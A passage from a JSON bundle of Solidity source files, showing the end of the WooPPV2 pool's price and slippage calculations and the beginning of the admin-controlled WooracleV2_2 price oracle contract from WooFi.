decs.baseDec;\n        }\n\n        // newPrice = oracle.price * (1 - k * oracle.price * baseAmount)\n        newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;\n    }\n\n    function _calcBaseAmountSellQuote(\n        address baseToken,\n        uint256 quoteAmount,\n        IWooracleV2.State memory state\n    ) private view returns (uint256 baseAmount, uint256 newPrice) {\n        require(state.woFeasible, \"WooPPV2: !ORACLE_FEASIBLE\");\n\n        DecimalInfo memory decs = decimalInfo(baseToken);\n\n        // gamma = k * quote_amount; and decimal 18\n        uint256 gamma;\n        {\n            require(quoteAmount <= tokenInfos[baseToken].maxNotionalSwap, \"WooPPV2: !maxNotionalValue\");\n\n            gamma = (quoteAmount * state.coeff) / decs.quoteDec;\n            require(gamma <= tokenInfos[baseToken].maxGamma, \"WooPPV2: !gamma\");\n\n            // Formula: baseAmount = quoteAmount / oracle.price * (1 - oracle.k * quoteAmount - oracle.spread)\n            baseAmount =\n                (((quoteAmount * decs.baseDec * decs.priceDec) / state.price) *\n                    (uint256(1e18) - gamma - state.spread)) /\n                1e18 /\n                decs.quoteDec;\n        }\n\n        // new_price = oracle.price / (1 - k * quoteAmount)\n        newPrice = (uint256(1e18) * state.price) / (uint256(1e18) - gamma);\n    }\n\n    function _maxUInt16(uint16 a, uint16 b) private pure returns (uint16) {\n        return a > b ? a : b;\n    }\n\n    function _maxUInt64(uint64 a, uint64 b) private pure returns (uint64) {\n        return a > b ? a : b;\n    }\n}"
    },
    {
      "filename": "WooPoolV2/contracts/wooracle/WooracleV2_2.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity =0.8.14;\n\n/*\n\n░██╗░░░░░░░██╗░█████╗░░█████╗░░░░░░░███████╗██╗\n░██║░░██╗░░██║██╔══██╗██╔══██╗░░░░░░██╔════╝██║\n░╚██╗████╗██╔╝██║░░██║██║░░██║█████╗█████╗░░██║\n░░████╔═████║░██║░░██║██║░░██║╚════╝██╔══╝░░██║\n░░╚██╔╝░╚██╔╝░╚█████╔╝╚█████╔╝░░░░░░██║░░░░░██║\n░░░╚═╝░░░╚═╝░░░╚════╝░░╚════╝░░░░░░░╚═╝░░░░░╚═╝\n\n*\n* MIT License\n* ===========\n*\n* Copyright (c) 2020 WooTrade\n*\n* Permission is hereby granted, free of charge, to any person obtaining a copy\n* of this software and associated documentation files (the \"Software\"), to deal\n* in the Software without restriction, including without limitation the rights\n* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n* copies of the Software, and to permit persons to whom the Software is\n* furnished to do so, subject to the following conditions:\n*\n* The above copyright notice and this permission notice shall be included in all\n* copies or substantial portions of the Software.\n*\n* THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n*/\n\nimport \"../interfaces/IWooracleV2.sol\";\nimport \"../interfaces/AggregatorV3Interface.sol\";\n\nimport {TransferHelper} from \"@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol\";\n\n// OpenZeppelin contracts\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport {ReentrancyGuard} from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport {IERC20, SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/// @title Wooracle V2.2 contract for WooPPV2\n/// subversion 1 change: no timestamp update for posting price from WooPP.\n/// subversion 2 change: support legacy postState utilizing block.timestamp\ncontract WooracleV2_2 is Ownable, IWooracleV2 {\n    /* ----- State variables ----- */\n\n    // 128 + 64 + 64 = 256 bits (slot size)\n    struct TokenInfo {\n        uint128 price; // as chainlink oracle (e.g. decimal = 8)                zip: 32 bits = (27, 5)\n        uint64 coeff; // k: decimal = 18.    18.4 * 1e18                        zip: 16 bits = (11, 5), 2^11 = 2048\n        uint64 spread; // s: decimal = 18.   spread <= 2e18   18.4 * 1e18       zip: 16 bits = (11, 5)\n    }\n\n    struct CLOracle {\n        address oracle;\n        uint8 decimal;\n        bool cloPreferred;\n    }\n\n    mapping(address => TokenInfo) public infos;\n    mapping(address => CLOracle) public clOracles;\n\n    address public quoteToken;\n    uint256 public timestamp;\n\n    uint256 public staleDuration;\n    uint64 public bound;\n\n    address public wooPP;\n\n    mapping(address => bool) public isAdmin;\n\n    mapping(uint8 => address) public basesMap;\n\n    constructor() {\n        staleDuration = uint256(120); // default: 2 mins\n        bound = uint64(1e16); // 1%\n    }\n\n    modifier onlyAdmin() {\n        require(owner() == msg.sender || isAdmin[msg.sender], \"WooracleV2_2: !Admin\");\n        _;\n    }\n\n    /* ----- External Functions ----- */\n\n    function setWooPP(address _wooPP) external onlyAdmin {\n        wooPP = _wooPP;\n    }\n\n    function setAdmin(address _addr, bool _flag) external onlyOwner {\n        isAdmin[_addr] = _flag;\n    }\n\n    /// @dev Set the quote token address.\n    /// @param _oracle the token address\n    function setQuoteToken(address _quote, address _oracle) external onlyAdmin {\n        quoteToken = _quote;\n        CLOracle storage cloRef = clOracles[_quote];\n        cloRef.oracle = _oracle;\n        cloRef.decimal = AggregatorV3Interface(_oracle).decimals();\n    }\n\n    function setBound(uint64 _bound) external onlyOwner {\n        bound = _bound;\n    }\n\n    function setCLOracle(\n        address _token,\n        address _oracle,\n        bool _cloPreferred\n    ) external onlyAdmin {\n        CLOracle storage cloRef = clOracles[_token];\n        cloRef.oracle = _oracle;\n        cloRef.decimal = AggregatorV3Interface(_oracle).decimals();\n        cloRef.cloPreferred = _cloPreferred;\n    }\n\n    function setCloPreferred(address _token, bool _cloPreferred) external onlyAdmin {\n        CLOracle storage cloRef = clOracles[_token];\n        cloRef.cloPreferred = _cloPreferred;\n    }\n\n    /// @dev Set the staleDuration.\n    /// @param _staleDuration the new stale duration\n    function setStaleDuration(uint256 _staleDuration) external onlyAdmin {\n        staleDuration = _staleDuration;\n    }\n\n    /// @dev Update the base token prices.\n    /// @param _base the baseToken address\n    /// @param _price the new prices for the base token\n    function postPrice(address _base, uint128 _price) external onlyAdmin {\n        infos[_base].price = _price;\n        if (msg.sender != wooPP) {\n            timestamp = block.timestamp;\n        }\n    }\n\n    /// @dev Update the base token prices.\n    /// @param _base the baseToken address\n    /// @param _price the new prices for the base token\n    function postPrice(\n        address _base,\n        uint128 _price,\n        uint256 _ts\n    ) external onlyAdmin {\n        infos[_base].price = _price;\n        timestamp = _ts;\n    }\n\n    /// @dev batch update baseTokens prices\n    /// @param _bases list of baseToken address\n    /// @param _prices the updated prices list\n    function postPriceList(\n        address[] calldata _bases,\n        uint128[] calldata _prices,\n        uint256 _ts\n    ) external onlyAdmin {\n        uint256 length = _bases.length;\n        require(length == _prices.length, \"WooracleV2_2: length_INVALID\");\n\n        unchecked {\n            for (uint256 i = 0; i < length; i++) {\n                infos[_bases[i]].price = _prices[i];\n            }\n        }\n\n        timestamp = _ts;\n    }\n\n    /// @dev update the state of the given base token.\n    /// @param _base baseToken address\n    /// @param _price the new prices\n    /// @param _spread the new spreads\n    /// @param _coeff the new slippage coefficent\n    function postState(\n        address _base,\n        uint128 _price,\n        uint64 _spread,\n        uint64 _coeff\n    ) external onlyAdmin {\n        _setState(_base, _price, _spread, _coeff);\n        timestamp = block.timestamp;\n    }\n\n    /// @dev update the state of the given base token with the offchain timestamp.\n    /// @param _base baseToken address\n    /// @param _price the new prices\n    /// @param _spread the new spreads\n    /// @param _coeff the new slippage coefficent\n    /// @param _ts the local timestamp\n    function postState(\n        address _base,\n        uint128 _price,\n        uint64 _spread,\n        uint64 _coeff,\n        uint256 _ts\n    ) external onlyAdmin {\n        _setState(_base, _price, _spread, _coeff);\n        timestamp = _ts;\n    }\n\n    /// @dev batch update the prices, spreads and slipagge coeffs info.\n    /// @param _bases list of baseToken address\n    /// @param _prices the prices list\n    /// @param _spreads the spreads list\n    /// @param _coeffs the slippage coefficent list\n    function postStateList(\n        address[] calldata _bases,\n        uint128[] calldata _prices,\n        uint64[] calldata _spreads,\n        uint64[] calldata _coeffs,\n        uint256 _ts\n    ) external onlyAdmin {\n        uint256 length = _bases.length;\n        unchecked {\n            for (uint256 i = 0; i < length; i++) {\n                _setState(_bases[i], _prices[i], _spreads[i], _coeffs[i]);\n            }\n        }\n        timestamp = _ts;\n    }\n\n    /*\n        Price logic:\n        - woPrice: wooracle price"
    }
  ]
}